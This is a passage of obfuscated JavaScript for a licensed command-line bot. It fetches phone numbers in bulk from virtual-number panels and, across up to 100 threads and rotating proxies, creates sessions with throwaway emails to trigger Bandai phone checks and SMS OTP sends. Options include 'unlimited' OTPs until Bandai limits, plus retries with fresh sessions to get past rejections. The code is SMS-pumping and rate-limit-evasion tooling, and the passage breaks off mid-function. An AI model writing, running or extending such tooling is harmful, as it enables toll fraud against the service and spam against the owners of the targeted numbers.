async function selectOption(v466, v467) {
  return new Promise(v468 => {
    let v469 = 0x0;
    process.stdin.resume();
    const v470 = require("readline");
    v470.emitKeypressEvents(process.stdin);
    if (process.stdin.isTTY) process.stdin.setRawMode(true);
    const fn5 = () => {
      process.stdout.write("[2J[H");
      printHeader(), console.log("   [33m" + v466 + "[0m\n");
      v467.forEach((v471, v472) => {
        v472 === v469 ? console.log("   [36m➔[35m " + v471.name + "[0m") : console.log("     [90m" + v471.name + "[0m");
      });
    };
    fn5();
    const fn6 = (v473, v474) => {
      if (v474.ctrl && v474.name === 'c') process.exit(0x0);
      if (v474.name === 'up') v469 = (v469 - 0x1 + v467.length) % v467.length, fn5();else {
        if (v474.name === "down") v469 = (v469 + 0x1) % v467.length, fn5();else {
          if (v474.name === "return") {
            if (process.stdin.isTTY) process.stdin.setRawMode(false);
            process.stdin.removeListener("keypress", fn6), v468(v467[v469].value);
          }
        }
      }
    };
    process.stdin.on("keypress", fn6);
  });
}
async function promptText(v475, v476 = '') {
  return new Promise(v477 => {
    process.stdout.write("   [33m" + v475 + "[0m ");
    let v478 = '';
    if (process.stdin.isTTY) process.stdin.setRawMode(false);
    process.stdin.resume();
    const fn7 = v479 => {
      const v480 = v479.toString();
      if (v480.includes('\x0a') || v480.includes('\x0d')) {
        process.stdin.removeListener("data", fn7), v478 += v480.split(/[\r\n]/)[0x0];
        let v481 = v478.trim();
        if (v481.startsWith('\x22') && v481.endsWith('\x22')) v481 = v481.slice(0x1, -1);
        v477(v481 || v476);
      } else v478 += v480;
    };
    process.stdin.on("data", fn7);
  });
}
async function interactiveWizard() {
  let v482 = 0x1,
    v483 = "file";
  let v484 = "numbers.txt",
    v485 = null;
  let v486 = null,
    v487 = null,
    v488 = null,
    v489 = "none",
    v490 = 0x14,
    v491 = 0x3,
    v492 = 0x1,
    v493 = null,
    v494 = '';
  const v495 = path.join(__dirname, ".nexa_api_key");
  if (fs.existsSync(MCX_KEY)) v494 = fs.readFileSync(MCX_KEY, "utf8").trim();
  while (true) {
    process.stdout.write("[2J[H"), printHeader();
    if (v482 === 0x1) {
      const v496 = {};
      v496.name = "📁 Load from file (numbers.txt)", v496.value = "file";
      const v497 = {};
      v497.name = "📱 Enter single phone number", v497.value = "single";
      const v498 = {};
      v498.name = "⚡ Auto fetch from Zenex", v498.value = "zenex";
      const v499 = await selectOption("SELECT NUMBER SOURCE", [v496, v497, {
        'name': "🌐 Auto fetch from NexaOTP Panel",
        'value': "nexa"
      }, {
        'name': "⚡ Auto fetch from Voltx (2oo9)",
        'value': "voltx"
      }, {
        'name': "🔥 Auto fetch from Stex (2oo9)",
        'value': "stex"
      }, {
        'name': "📱 Auto fetch from SMS Bower",
        'value': "smsbower"
      }, v498, {
        'name': "❌ Exit Program",
        'value': "exit"
      }]);
      if (v499 === "exit") process.exit(0x0);
      v483 = v499, v482 = 0x2;
    } else {
      if (v482 === 0x2) {
        if (v483 === "single") {
          const v500 = await promptText("Enter Phone Number (e.g. +393680810514 or IT:3680810514):", '');
          if (v500.toLowerCase() === "back" || !v500) {
            v482 = 0x1;
            continue;
          }
          v493 = v500.trim(), v482 = 0x3;
        } else {
          if (v483 === "voltx" || v483 === "stex") {
            const v501 = v483 === "voltx" ? "Voltx ⚡" : "Stex 🔥",
              v502 = v483 === "voltx" ? VOLTX_KEY_FILE : STEX_KEY_FILE,
              v503 = v483 === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/getnum" : "/MXS47FLFX0U/tness/@public/api/getnum",
              v504 = v483 === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/console" : "/MXS47FLFX0U/tness/@public/api/console";
            let v505 = '',
              v506 = [],
              v507 = 0x32,
              v508 = false,
              v509 = 0x1;
            while (v509 <= 0x3 && !v508) {
              process.stdout.write("[2J[H"), printHeader();
              if (v509 === 0x1) {
                if (fs.existsSync(v502)) {
                  v505 = fs.readFileSync(v502, "utf8").trim();
                  const v510 = {};
                  v510.name = "Remove saved key", v510.value = "remove";
                  const v511 = {};
                  v511.name = "⬅️ Back", v511.value = "back";
                  const v512 = await selectOption(v501 + " key found (" + v505.substring(0x0, 0xa) + "...)", [{
                    'name': "Use saved key",
                    'value': "use"
                  }, {
                    'name': "Enter new key",
                    'value': "new"
                  }, v510, v511]);
                  if (v512 === "back") {
                    v508 = true;
                    break;
                  }
                  if (v512 === "remove") fs.existsSync(v502) && fs.unlinkSync(v502), v505 = '';else v512 === "new" && (v505 = '');
                }
                if (!v505) {
                  const v513 = await promptText("Enter " + v501 + " API Key (mauthapi):", '');
                  if (v513.toLowerCase() === "back") {
                    v508 = true;
                    break;
                  }
                  v505 = v513;
                  const v514 = {};
                  v514.name = 'No', v514.value = 'no';
                  const v515 = await selectOption("Save key?", [{
                    'name': "Yes",
                    'value': "yes"
                  }, v514]);
                  if (v515 === "yes" && v505) fs.writeFileSync(v502, v505, "utf8");
                }
                if (v505) v509 = 0x2;
              } else {
                if (v509 === 0x2) {
                  const v516 = await selectOption("How to select ranges?", [{
                    'name': "🔍 Auto Range Finder (scan console)",
                    'value': "auto"
                  }, {
                    'name': "✏️  Enter manually",
                    'value': "manual"
                  }, {
                    'name': "⬅️ Back",
                    'value': "back"
                  }]);
                  if (v516 === "back") {
                    v509 = 0x1;
                    continue;
                  }
                  if (v516 === "auto") {
                    const v517 = await autoRangeFinderFor2Oo(v505, v504, selectOption, promptText);
                    v517 && v517.length > 0x0 && (v506 = v517, v509 = 0x3);
                  } else {
                    v506 = [];
                    let v518 = true;
                    while (v518) {
                      const v519 = await promptText("Enter range #" + (v506.length + 0x1) + " (e.g. 26134XXX) or 'back':", '');
                      if (v519.toLowerCase() === "back") {
                        if (v506.length === 0x0) break;else {
                          v506.pop();
                          continue;
                        }
                      }
                      if (v519) v506.push(v519);
                      const v520 = {};
                      v520.name = "Yes", v520.value = "yes";
                      const v521 = {};
                      v521.name = 'No', v521.value = 'no';
                      const v522 = await selectOption("Added " + v506.length + ". Add another?", [v520, v521]);
                      if (v522 === 'no') v518 = false;
                    }
                    if (v506.length > 0x0) v509 = 0x3;
                  }
                } else {
                  if (v509 === 0x3) {
                    const v523 = await promptText("How many numbers? [default:50]:", '50');
                    if (v523.toLowerCase() === "back") {
                      v509 = 0x2;
                      continue;
                    }
                    v507 = parseInt(v523) || 0x32;
                    const v524 = {};
                    v524.provider = v483, v524.apiKey = v505, v524.getPath = v503, v524.consolePath = v504, v524.ranges = v506, v524.totalCount = v507, v488 = v524, v485 = null, v509 = 0x4;
                  }
                }
              }
            }
            if (v508) {
              v482 = 0x1;
              continue;
            }
            v482 = 0x3;
          } else {
            if (v483 === "smsbower") {
              let v525 = '',
                v526 = 'fb',
                v527 = '0',
                v528 = "0.5",
                v529 = 0x32,
                v530 = 0x1,
                v531 = false;
              while (v530 <= 0x4 && !v531) {
                process.stdout.write("[2J[H"), printHeader();
                if (v530 === 0x1) {
                  if (fs.existsSync(SMSBOWER_KEY_FILE)) {
                    v525 = fs.readFileSync(SMSBOWER_KEY_FILE, "utf8").trim();
                    const v532 = {};
                    v532.name = "Enter new key", v532.value = "new";
                    const v533 = await selectOption("SMS Bower key found (" + v525.substring(0x0, 0xa) + "...)", [{
                      'name': "Use saved key",
                      'value': "use"
                    }, v532, {
                      'name': "Remove saved key",
                      'value': "remove"
                    }, {
                      'name': "⬅️ Back",
                      'value': "back"
                    }]);
                    if (v533 === "back") {
                      v531 = true;
                      break;
                    }
                    if (v533 === "remove") fs.existsSync(SMSBOWER_KEY_FILE) && fs.unlinkSync(SMSBOWER_KEY_FILE), v525 = '';else {
                      if (v533 === "new") v525 = '';
                    }
                  }
                  if (!v525) {
                    v525 = await promptText("Enter SMS Bower API Key:", '');
                    if (v525.toLowerCase() === "back") {
                      v531 = true;
                      break;
                    }
                    const v534 = {};
                    v534.name = "Yes", v534.value = "yes";
                    const v535 = {};
                    v535.name = 'No', v535.value = 'no';
                    const v536 = await selectOption("Save key?", [v534, v535]);
                    if (v536 === "yes" && v525) fs.writeFileSync(SMSBOWER_KEY_FILE, v525, "utf8");
                  }
                  if (v525) v530 = 0x2;
                } else {
                  if (v530 === 0x2) {
                    v526 = await promptText("Service code (e.g. fb, ig, wa) [default: fb]:", 'fb');
                    if (v526.toLowerCase() === "back") {
                      v530 = 0x1;
                      continue;
                    }
                    v526 = v526 || 'fb', v530 = 0x3;
                  } else {
                    if (v530 === 0x3) {
                      v527 = await promptText("Country code (0 = any) [default: 0]:", '0');
                      if (v527.toLowerCase() === "back") {
                        v530 = 0x2;
                        continue;
                      }
                      v527 = v527 || '0';
                      const v537 = await promptText("Max price per number [default: 0.5]:", "0.5");
                      v528 = v537 || "0.5", v530 = 0x4;
                    } else {
                      if (v530 === 0x4) {
                        const v538 = await promptText("How many numbers? [default: 50]:", '50');
                        if (v538.toLowerCase() === "back") {
                          v530 = 0x3;
                          continue;
                        }
                        v529 = parseInt(v538) || 0x32;
                        const v539 = {};
                        v539.apiKey = v525, v539.service = v526, v539.country = v527, v539.maxPrice = v528, v539.totalCount = v529, v486 = v539, v485 = null, v488 = null, v487 = null, v530 = 0x5;
                      }
                    }
                  }
                }
              }
              if (v531) {
                v482 = 0x1;
                continue;
              }
              v482 = 0x3;
            } else {
              if (v483 === "zenex") {
                let v540 = '',
                  v541 = [],
                  v542 = 0x32,
                  v543 = 0x1,
                  v544 = false;
                while (v543 <= 0x3 && !v544) {
                  process.stdout.write("[2J[H"), printHeader();
                  if (v543 === 0x1) {
                    if (fs.existsSync(ZENEX_KEY_FILE)) {
                      v540 = fs.readFileSync(ZENEX_KEY_FILE, "utf8").trim();
                      const v545 = {};
                      v545.name = "Use saved key", v545.value = "use";
                      const v546 = {};
                      v546.name = "Enter new key", v546.value = "new";
                      const v547 = {};
                      v547.name = "Remove saved key", v547.value = "remove";
                      const v548 = {};
                      v548.name = "⬅️ Back", v548.value = "back";
                      const v549 = await selectOption("Zenex key found (" + v540.substring(0x0, 0xa) + "...)", [v545, v546, v547, v548]);
                      if (v549 === "back") {
                        v544 = true;
                        break;
                      }
                      if (v549 === "remove") fs.existsSync(ZENEX_KEY_FILE) && fs.unlinkSync(ZENEX_KEY_FILE), v540 = '';else {
                        if (v549 === "new") v540 = '';
                      }
                    }
                    if (!v540) {
                      v540 = await promptText("Enter Zenex API Key (mapikey):", '');
                      if (v540.toLowerCase() === "back") {
                        v544 = true;
                        break;
                      }
                      const v550 = {};
                      v550.name = "Yes", v550.value = "yes";
                      const v551 = {};
                      v551.name = 'No', v551.value = 'no';
                      const v552 = await selectOption("Save key?", [v550, v551]);
                      if (v552 === "yes" && v540) fs.writeFileSync(ZENEX_KEY_FILE, v540, "utf8");
                    }
                    if (v540) v543 = 0x2;
                  } else {
                    if (v543 === 0x2) {
                      v541 = [];
                      let v553 = true;
                      while (v553) {
                        const v554 = await promptText("Enter range #" + (v541.length + 0x1) + " (e.g. 4473845XXX) or 'back':", '');
                        if (v554.toLowerCase() === "back") {
                          if (v541.length === 0x0) {
                            v544 = true;
                            break;
                          } else {
                            v541.pop();
                            continue;
                          }
                        }
                        if (v554) v541.push(v554);
                        const v555 = {};
                        v555.name = 'No', v555.value = 'no';
                        const v556 = await selectOption("Added " + v541.length + ". Add another?", [{
                          'name': "Yes",
                          'value': "yes"
                        }, v555]);
                        if (v556 === 'no') v553 = false;
                      }
                      if (v541.length > 0x0) v543 = 0x3;
                    } else {
                      if (v543 === 0x3) {
                        const v557 = await promptText("How many numbers? [default: 50]:", '50');
                        if (v557.toLowerCase() === "back") {
                          v543 = 0x2;
                          continue;
                        }
                        v542 = parseInt(v557) || 0x32;
                        const v558 = {};
                        v558.apiKey = v540, v558.ranges = v541, v558.totalCount = v542, v487 = v558, v485 = null, v488 = null, v486 = null, v543 = 0x4;
                      }
                    }
                  }
                }
                if (v544) {
                  v482 = 0x1;
                  continue;
                }
                v482 = 0x3;
              } else {
                if (v483 === "file") {
                  const v559 = await promptText("Enter Target Numbers File Path (or 'back'):", '');
                  if (v559.toLowerCase() === "back" || !v559.trim()) {
                    v482 = 0x1;
                    continue;
                  }
                  let v560 = v559.replace(/^["']|["']$/g, '').trim();
                  if (!fs.existsSync(v560)) {
                    console.log(R("\n  ✗ File not found: " + v560 + '\x0a')), await new Promise(v561 => setTimeout(v561, 0x5dc));
                    continue;
                  }
                  v484 = v560, v485 = null, v482 = 0x3;
                } else {
                  let v562 = 0x1,
                    v563 = false,
                    v564 = '',
                    v565 = [],
                    v566 = 0x32,
                    v567 = "/api/v1/numbers/get";
                  while (v562 <= 0x4 && !v563) {
                    process.stdout.write("[2J[H"), printHeader();
                    if (v562 === 0x1) {
                      if (fs.existsSync(v495)) {
                        const v568 = fs.readFileSync(v495, "utf8").trim(),
                          v569 = {};
                        v569.name = "Yes, use saved key", v569.value = "yes";
                        const v570 = {};
                        v570.name = "Delete saved key", v570.value = "delete";
                        const v571 = {};
                        v571.name = "⬅️ Go Back to Number Source", v571.value = "back";
                        const v572 = await selectOption("Found saved API Key (..." + v568.slice(-4) + "). Use it?", [v569, {
                          'name': "No, enter new key",
                          'value': 'no'
                        }, v570, v571]);
                        if (v572 === "back") {
                          v563 = true;
                          break;
                        }
                        if (v572 === "yes") v564 = v568;else {
                          if (v572 === "delete") {
                            if (fs.existsSync(v495)) fs.unlinkSync(v495);
                            v564 = '';
                          }
                        }
                      }
                      if (!v564) {
                        const v573 = await promptText("Enter NexaOTP API Key (type 'back' to go back):", '');
                        if (v573.toLowerCase() === "back") {
                          v563 = true;
                          break;
                        }
                        v564 = v573;
                        const v574 = {};
                        v574.name = "Yes, save it", v574.value = "yes";
                        const v575 = {};
                        v575.name = 'No', v575.value = 'no';
                        const v576 = await selectOption("Save this key for future use?", [v574, v575]);
                        v576 === "yes" && v564 && fs.writeFileSync(v495, v564, "utf8");
                      }
                      if (v564) v562 = 0x2;
                    } else {
                      if (v562 === 0x2) {
                        v565 = [];
                        let v577 = true;
                        while (v577) {
                          const v578 = await promptText("Enter range #" + (v565.length + 0x1) + " (e.g. 21624485XXX) or type 'back':", '');
                          if (v578.toLowerCase() === "back") {
                            if (v565.length === 0x0) {
                              v562 = 0x1;
                              break;
                            } else {
                              v565.pop();
                              continue;
                            }
                          }
                          if (v578) v565.push(v578);
                          const v579 = {};
                          v579.name = "Yes, add another range", v579.value = "yes";
                          const v580 = {};
                          v580.name = "No, proceed to next step", v580.value = 'no';
                          const v581 = {};
                          v581.name = "⬅️ Go Back to API Key", v581.value = "back";
                          const v582 = await selectOption("Added " + v565.length + " range(s). Add another?", [v579, v580, v581]);
                          if (v582 === "back") {
                            v562 = 0x1;
                            break;
                          }
                          if (v582 === 'no') v577 = false;
                        }
                        if (v565.length > 0x0) v562 = 0x3;
                      } else {
                        if (v562 === 0x3) {
                          const v583 = await promptText("How many numbers to process? (type 'back' to go back) [default: 50]:", '50');
                          if (v583.toLowerCase() === "back") {
                            v562 = 0x2;
                            continue;
                          }
                          v566 = parseInt(v583) || 0x32, v562 = 0x4;
                        } else {
                          if (v562 === 0x4) {
                            const v584 = {};
                            v584.name = "Server 2 (/p2/get)", v584.value = "/api/v1/numbers/p2/get";
                            const v585 = {};
                            v585.name = "Server 3 (/p3/get)", v585.value = "/api/v1/numbers/p3/get";
                            const v586 = await selectOption("SELECT NEXA SERVER", [{
                              'name': "Server 1 (/get)",
                              'value': "/api/v1/numbers/get"
                            }, v584, v585, {
                              'name': "⬅️ Go Back to Count Input",
                              'value': "back"
                            }]);
                            if (v586 === "back") {
                              v562 = 0x3;
                              continue;
                            }
                            v567 = v586;
                            const v587 = {};
                            v587.apiKey = v564, v587.ranges = v565, v587.totalCount = v566, v587.serverEndpoint = v567, v485 = v587, v562 = 0x5;
                          }
                        }
                      }
                    }
                  }
                  if (v563) {
                    v482 = 0x1;
                    continue;
                  }
                  v482 = 0x3;
                }
              }
            }
          }
        }
      } else {
        if (v482 === 0x3) {
          const v588 = {};
          v588.name = "📁 Enter Proxies File Path", v588.value = "custom";
          const v589 = {};
          v589.name = "🚫 None (Direct Connection)", v589.value = "none";
          const v590 = {};
          v590.name = "⬅️ Go Back to Numbers Selection", v590.value = "back";
          const v591 = await selectOption("SELECT PROXY MODE", [v588, v589, v590]);
          if (v591 === "back") {
            v482 = 0x2;
            continue;
          }
          if (v591 === "custom") {
            const v592 = await promptText("Enter Proxies File Path (or 'back'):", '');
            if (v592.toLowerCase() === "back" || !v592.trim()) continue;
            let v593 = v592.replace(/^["']|["']$/g, '').trim();
            if (!fs.existsSync(v593)) {
              console.log(R("\n  ✗ File not found: " + v593 + '\x0a')), await new Promise(v594 => setTimeout(v594, 0x5dc));
              continue;
            }
            v489 = v593;
          } else v591 === "none" && (v489 = '');
          v482 = 0x4;
        } else {
          if (v482 === 0x4) {
            const v595 = {};
            v595.name = "10 Threads", v595.value = 0xa;
            const v596 = {};
            v596.name = "20 Threads (Default)", v596.value = 0x14;
            const v597 = {};
            v597.name = "50 Threads (Fast)", v597.value = 0x32;
            const v598 = {};
            v598.name = "⬅️ Go Back to Proxies Selection", v598.value = "back";
            const v599 = await selectOption("SELECT THREADS", [v595, v596, v597, {
              'name': "100 Threads (Extreme)",
              'value': 0x64
            }, {
              'name': "⌨️ Custom...",
              'value': "custom"
            }, v598]);
            if (v599 === "back") {
              v482 = 0x3;
              continue;
            }
            if (v599 === "custom") {
              const v600 = await promptText("Enter custom number of threads (type 'back' to go back):", '20');
              if (v600.toLowerCase() === "back") continue;
              v490 = parseInt(v600) || 0x14;
            } else v490 = v599;
            v482 = 0x5;
          } else {
            if (v482 === 0x5) {
              const v601 = {};
              v601.name = "3 OTPs per Email (Default)", v601.value = 0x3;
              const v602 = {};
              v602.name = "1 OTP per Email (Fresh email for each number)", v602.value = 0x1;
              const v603 = {};
              v603.name = "♾️  Unlimited (Keep sending until Bandai rejects / limits)", v603.value = 0x0;
              const v604 = {};
              v604.name = "⌨️ Custom Number...", v604.value = "custom";
              const v605 = {};
              v605.name = "⬅️ Go Back to Threads Selection", v605.value = "back";
              const v606 = await selectOption("HOW MANY OTPS PER EMAIL?", [v601, {
                'name': "5 OTPs per Email",
                'value': 0x5
              }, v602, v603, v604, v605]);
              if (v606 === "back") {
                v482 = 0x4;
                continue;
              }
              if (v606 === "custom") {
                const v607 = await promptText("Enter number of OTPs per email (0 for unlimited, or 'back'):", '3');
                if (v607.toLowerCase() === "back") continue;
                v491 = isNaN(parseInt(v607)) ? 0x3 : Math.max(0x0, parseInt(v607));
              } else v491 = v606;
              v482 = 0x6;
            } else {
              if (v482 === 0x6) {
                const v608 = {};
                v608.name = "🔁 Yes, retry 1 time with fresh session (Default)", v608.value = 0x1;
                const v609 = {};
                v609.name = "🔁 Yes, retry up to 2 times", v609.value = 0x2;
                const v610 = {};
                v610.name = "🚫 No, skip immediately on failure", v610.value = 0x0;
                const v611 = {};
                v611.name = "⌨️ Custom Retry Count...", v611.value = "custom";
                const v612 = {};
                v612.name = "⬅️ Go Back to OTPs Per Email", v612.value = "back";
                const v613 = await selectOption("IF REJECTED, RETRY WITH FRESH SESSION?", [v608, v609, {
                  'name': "🔁 Yes, retry up to 3 times",
                  'value': 0x3
                }, v610, v611, v612]);
                if (v613 === "back") {
                  v482 = 0x5;
                  continue;
                }
                if (v613 === "custom") {
                  const v614 = await promptText("Enter max retry attempts (0 for none, or 'back'):", '1');
                  if (v614.toLowerCase() === "back") continue;
                  v492 = isNaN(parseInt(v614)) ? 0x1 : Math.max(0x0, parseInt(v614));
                } else v492 = v613;
                v482 = 0x7;
              } else {
                if (v482 === 0x7) break;
              }
            }
          }
        }
      }
    }
  }
  return process.stdin.pause(), {
    'numbersFile': v484,
    'threads': String(v490),
    'proxiesFile': v489,
    'singleNumber': v493,
    'nexaConfig': v485,
    'twoOoConfig': v488,
    'smsBowerConfig': v486,
    'zenexConfig': v487,
    'mcxKey': v494,
    'otpsPerEmail': v491,
    'maxRetries': v492
  };
}
async function main() {
  try {
    let v615 = process.argv.slice(0x2),
      v616 = null,
      v617 = null,
      v618 = null,
      v619 = null,
      v620 = null,
      v621 = '';
    if (fs.existsSync(MCX_KEY)) v621 = fs.readFileSync(MCX_KEY, "utf8").trim();
    let v622 = '',
      v623 = 0x14,
      v624 = '',
      v625 = 0x3,
      v626 = 0x1;
    if (v615.length === 0x0) {
      const v643 = await interactiveWizard();
      v622 = v643.numbersFile, v623 = parseInt(v643.threads) || 0x14, v624 = v643.proxiesFile, v620 = v643.singleNumber, v616 = v643.nexaConfig, v617 = v643.twoOoConfig, v618 = v643.smsBowerConfig, v619 = v643.zenexConfig, v621 = v643.mcxKey || v621, v625 = v643.otpsPerEmail !== undefined ? v643.otpsPerEmail : 0x3, v626 = v643.maxRetries !== undefined ? v643.maxRetries : 0x1;
    } else {
      v622 = (v615[0x0] || '').replace(/^["']|["']$/g, '').trim(), v623 = parseInt(v615[0x1]) || 0x14, v624 = v615[0x2] !== undefined ? v615[0x2] : '';
      if (v624.toLowerCase() === "none") v624 = '';else v624 = v624.replace(/^["']|["']$/g, '').trim();
      if (v615[0x3]) v625 = parseInt(v615[0x3]) || 0x3;
      if (v615[0x4]) v626 = parseInt(v615[0x4]) || 0x1;
    }
    printHeader(), console.log(B("  ✓ License: Licensed") + G(" | HWID: Verified"));
    let v627 = [];
    if (v620) v627 = [v620];else {
      if (!v616 && !v617 && !v618 && !v619) {
        const v644 = (v622 || '').replace(/^["']|["']$/g, '').trim();
        (!v644 || !fs.existsSync(v644)) && (console.error(R("✗ Error: Numbers file not found: " + v644)), process.exit(0x1)), v627 = fs.readFileSync(v644, "utf8").split(/\r?\n/).map(v645 => v645.trim()).filter(v646 => v646.length > 0x5 && !v646.startsWith('#'));
      }
    }
    let v628 = [];
    const v629 = (v624 || '').replace(/^["']|["']$/g, '').trim();
    v629 && fs.existsSync(v629) && (v628 = fs.readFileSync(v629, "utf8").split(/\r?\n/).map(v647 => v647.trim()).filter(v648 => v648.length > 0x0 && !v648.startsWith('#')));
    let v630 = v628.map(parsePx).filter(Boolean);
    const v631 = v616 || v617 || v618 || v619;
    if (v631) {
      const v649 = v616 ? "NexaOTP" : v617 ? v617.provider === "voltx" ? "Voltx ⚡" : "Stex 🔥" : v618 ? "📱 SMS Bower" : "⚡ Zenex";
      console.log(C("✓ Target  : " + v649 + " API (" + v631.totalCount + " numbers)"));
    } else console.log(C("✓ Loaded " + v627.length + " targets"));
    console.log(G("  Country rules: " + COUNTRY_PREFIXES.length + " loaded from country table (" + BANDAI_SUPPORTED_ISOS.size + " supported by Bandai)"));
    if (v630.length === 0x0) console.log(G("  No proxies configured (running direct)"));else console.log(C("✓ Proxies loaded: " + v630.length + " from " + v629));
    console.log(C("✓ Threads : " + v623)), console.log(C("✓ OTP/Mail: " + (v625 > 0x0 ? v625 + " per verified email" : "Unlimited (until limit)"))), console.log(C("✓ Retries : " + (v626 > 0x0 ? v626 + " attempts per rejected number" : "Disabled") + '\x0a'));
    if (!fs.existsSync(SUCCESSFUL_FILE)) fs.writeFileSync(SUCCESSFUL_FILE, '');
    if (!fs.existsSync(FAILED_FILE)) fs.writeFileSync(FAILED_FILE, '');
    const v632 = v631 ? v631.totalCount : v627.length,
      v633 = new Dashboard(v632);
    let v634 = [],
      v635 = [],
      v636 = 0x0,
      v637 = false;
    if (v616 || v617) {
      const v650 = v616 ? "NexaOTP" : v617.provider === "voltx" ? "Voltx ⚡" : "Stex 🔥";
      console.log(Y("\n  [" + v650 + "] Streaming " + v631.totalCount + " numbers (" + v631.ranges.length + " range(s))...")), (async () => {
        let v651 = 0x0;
        let v652 = '';
        try {
          for (let v653 = 0x0; v653 < v631.totalCount; v653++) {
            try {
              const v654 = v631.ranges[Math.floor(Math.random() * v631.ranges.length)];
              let v655;
              v616 ? v655 = await nexaLimiter.enqueue(() => nexaFetchNumber(v616.apiKey, v654, v616.serverEndpoint)) : v655 = await twoOoLimiter.enqueue(() => twoOoFetchNumber(v617.apiKey, v654, v617.getPath)), v655 && (v636++, v651 = 0x0, v635.length > 0x0 ? v635.shift()(v655) : v634.push(v655));
            } catch (v656) {
              v652 = v656.message;
              if (v656.message.includes("Insufficient balance")) {
                console.error(R("\n  [" + v650 + "] ✗ Insufficient balance — aborting.\n"));
                break;
              }
              if (v656.message.includes("No numbers available")) continue;
              v651++;
              if (v651 >= 0x5 && v636 === 0x0) {
                console.error(R("\n  [" + v650 + "] ✗ Aborting — 5 consecutive failures. Last error: " + v652 + '\x0a'));
                break;
              }
            }
          }
        } finally {
          if (v636 === 0x0) console.error(R("\n  [" + v650 + "] ✗ No numbers fetched. Last error: " + (v652 || "Unknown") + '\x0a'));
          v637 = true;
          while (v635.length > 0x0) v635.shift()(null);
        }
      })();
    } else {
      if (v618) {
        const v657 = v618;
        console.log(Y("\n  [📱 SMS Bower] Streaming " + v657.totalCount + " numbers...")), (async () => {
          let v658 = 0x0;
          try {
            for (let v659 = 0x0; v659 < v657.totalCount; v659++) {
              try {
                const {
                  activationId: v660,
                  phoneNumber: v661
                } = await smsBowerFetchNumber(v657.apiKey, v657.service, v657.country, v657.maxPrice);
                v636++, v658 = 0x0;
                if (v635.length > 0x0) v635.shift()(v661);else v634.push(v661);
              } catch (v662) {
                v658++;
                if (v658 >= 0x5 && v636 === 0x0) break;
                await new Promise(v663 => setTimeout(v663, 0x7d0));
              }
            }
          } finally {
            v637 = true;
            while (v635.length > 0x0) v635.shift()(null);
          }
        })();
      } else {
        if (v619) {
          const v664 = v619;
          console.log(Y("\n  [⚡ Zenex] Streaming " + v664.totalCount + " numbers (" + v664.ranges.length + " range(s))...")), (async () => {
            let v665 = 0x0;
            try {
              for (let v666 = 0x0; v666 < v664.totalCount; v666++) {
                try {
                  const v667 = v664.ranges[Math.floor(Math.random() * v664.ranges.length)],
                    v668 = await zenexFetchNumber(v664.apiKey, v667);
                  v636++, v665 = 0x0;
                  if (v635.length > 0x0) v635.shift()(v668);else v634.push(v668);
                } catch (v669) {
                  v665++;
                  if (v665 >= 0x5 && v636 === 0x0) break;
                  await new Promise(v670 => setTimeout(v670, 0x7d0));
                }
              }
            } finally {
              v637 = true;
              while (v635.length > 0x0) v635.shift()(null);
            }
          })();
        }
      }
    }
    const v638 = !!(v616 || v617 || v618 || v619),
      v639 = v638 ? () => {
        if (v634.length > 0x0) return Promise.resolve(v634.shift());
        if (v637) return Promise.resolve(null);
        return new Promise(v671 => v635.push(v671));
      } : () => {
        if (v627.length === 0x0) return Promise.resolve(null);
        const v672 = Math.floor(Math.random() * v627.length);
        return Promise.resolve(v627.splice(v672, 0x1)[0x0]);
      },
      fn8 = () => {
        if (v630.length === 0x0) return null;
        const v673 = v630[Math.floor(Math.random() * v630.length)];
        return rotateSsid(v673);
      };
    function fn9(v674) {
      try {
        if (v638 || !v622 || !fs.existsSync(v622)) return;
        const v675 = fs.readFileSync(v622, "utf8"),
          v676 = v675.split(/\r?\n/).filter(v677 => v677.trim() !== v674.trim()).join('\x0a');
        fs.writeFileSync(v622, v676);
      } catch (v678) {}
    }
    const v640 = v638 ? Math.min(v623, v631.totalCount) : Math.min(v623, Math.max(v627.length, 0x1)),
      v641 = [],
      v642 = setInterval(() => v633.render(), 0x1f4);
    async function fn10(v679) {
      let v680 = null;
      while (true) {
        const v681 = await v639();
        if (!v681) break;
        const v682 = parsePhone(v681);
        if (!v682.supported) {
          v633.failed++, v633.processed++, fn9(v681), fs.appendFileSync(FAILED_FILE, v681 + " | " + v682.unsupportedReason + '\x0a'), v633.addLog("Failed on " + v681 + ':\x20' + v682.unsupportedReason, "error");
          continue;
        }
        let v683 = 0x0,
          v684 = 0x1 + (v626 || 0x0),
          v685 = false;
        while (v683 < v684 && !v685) {
          v683++;
          const v686 = v680 && Date.now() - v680.createdAt > 510000;
          if (!v680 || v686) try {
            const v687 = fn8();
            v680 = await createVerifiedSession({
              'proxy': v687,
              'mcxKey': v621,
              'onStatus': v688 => v633.setStatus("Worker " + v679 + ':\x20' + v688)
            });
          } catch (v689) {
            v680 = null;
            if (v683 < v684) {
              v633.addLog("Session error on " + v681 + ". Switching to another mail (" + v683 + '/' + v626 + ")...", "retry"), await new Promise(v690 => setTimeout(v690, 0x3e8));
              continue;
            } else {
              v633.failed++, v633.processed++, fn9(v681), fs.appendFileSync(FAILED_FILE, v681 + " | Session error\n"), v633.addLog("Failed on " + v681 + ": Session error", "error"), v685 = true;
              break;
            }
          }
          try {
            v633.setStatus("Worker " + v679 + ": Checking phone " + v682.countryNo + ':' + v682.phoneNo + "...");
            const v691 = await phoneCheck(v682.countryNo, v682.phoneNo, v680.jar, v680.csrf, v680.cl, v680.px);
            if (v691) {
              v633.failed++, v633.processed++, fn9(v681), fs.appendFileSync(FAILED_FILE, v681 + " | Phone already registered\n"), v633.addLog("Failed on " + v681 + ": Phone already registered", "error"), v685 = true;
              break;
            }
            v633.setStatus("Worker " + v679 + ": Sending SMS OTP (Session OTP #" + (v680.otpCount + 0x1) + ")..."), await phoneOtp(v682.countryNo, v682.phoneNo, v680.jar, v680.csrf, v680.cl, v680.px), v680.otpCount++;
            v680.otpCount > v633.maxOtpsPerSession && (v633.maxOtpsPerSession = v680.otpCount);
            v633.successful++, v633.processed++, fn9(v681), fs.appendFileSync(SUCCESSFUL_FILE, v681 + " | " + v680.email + " [OTP #" + v680.otpCount + ']\x0a');
            const v692 = v625 > 0x0 ? "[OTP #" + v680.otpCount + '/' + v625 + ']' : "[OTP #" + v680.otpCount + ']';
            v633.addLog(v681 + '\x20\x20' + chalk.cyan(v692) + '\x20\x20' + chalk.gray('(' + v680.email + ')'), "success"), v685 = true, v625 > 0x0 && v680.otpCount >= v625 && (v680 = null);
          } catch (v693) {
            const v694 = v693.message || String(v693),
              v695 = {};
